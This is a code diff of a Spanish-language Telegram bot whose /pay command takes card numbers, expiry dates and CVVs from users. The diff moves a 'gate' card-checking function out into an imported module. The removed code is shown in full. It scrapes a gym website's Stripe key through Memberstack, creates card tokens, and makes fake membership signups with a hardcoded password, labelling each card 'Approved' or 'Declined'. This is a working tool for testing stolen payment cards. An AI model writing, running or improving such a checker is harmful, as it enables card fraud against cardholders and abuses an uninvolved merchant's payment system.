@@ -3,7 +3,6 @@ import logging
 import random
 import string
 import time
-import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     Application,
@@ -13,6 +12,8 @@ from telegram.ext import (
     ContextTypes,
     filters,
 )
+# Importar el gate actualizado
+from gate import gate  
 
 # ======================
 # CONFIG
@@ -55,41 +56,6 @@ def formatear_tiempo_restante(expira_en: float) -> str:
     horas = (segundos % 86400) // 3600
     minutos = (segundos % 3600) // 60
     return f"{dias}d {horas}h {minutos}m restantes"
-
-# ======================
-# FUNCIÓN DEL GATE
-# ======================
-def gate(cc, mes, ano, cvv):
-    email = str(''.join(random.choices(string.ascii_lowercase + string.digits, k=15))) + '@gmail.com'
-    
-    headers_1 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0"}
-    payload = '{"site":"3d821376ab5cea803122c65b3572cff0"}'
-    r1 = requests.post('https://api.memberstack.io/site/memberships', headers=headers_1, data=payload).json()
-
-    key = r1['stripeKey']
-
-    headers_2 = {"accept": "application/json", "content-type": "application/x-www-form-urlencoded", "origin": "https://js.stripe.com", "referer": "https://js.stripe.com/", "user-agent": "Mozilla/5.0"}
-    payload_2 = f"card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&card[address_zip]=10080&key={key}"
-    r_2 = requests.post('https://api.stripe.com/v1/tokens', headers=headers_2, data=payload_2)
-    r2 = r_2.json()
-    r2_text = r_2.text
-
-    if 'declined' in r2_text:
-        return "❌ Declined"
-    else:
-        if 'id' not in r2:  
-            return "⚠️ Error en la tarjeta"
-        tok = r2['id']
-        headers_3 = {"accept": "*/*", "content-type": "application/json", "origin": "https://deutschgym.com", "referer": "https://deutschgym.com/", "user-agent": "Mozilla/5.0"}
-        payload_3 = '{"site":"3d821376ab5cea803122c65b3572cff0","email":"'+email+'","password":"Geho1902","membership":"62a0fa8eb4c4ff0004822daf","token":"'+tok+'"}'
-        r = requests.post('https://api.memberstack.io/member/signup', headers=headers_3, data=payload_3)
-        result = r.text
-        if 'cvc' in result or 'token' in result:
-            return "✅ Approved"
-        elif 'Cloudflare' in result:
-            return "⚠️ Proxy error, vuelve a intentar"
-        else:
-            return "❌ Declined"
 
 # ======================
 # HANDLERS
@@ -186,7 +152,7 @@ async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     try:
         cc, mes, ano, cvv = args[1].split("|")
-        result = gate(cc, mes, ano, cvv)
+        result = gate(cc, mes, ano, cvv)  # Usa el gate importado
         await update.message.reply_text(f"💳 Resultado: {result}")
     except Exception as e:
         await update.message.reply_text(f"⚠️ Error al procesar: {e}")
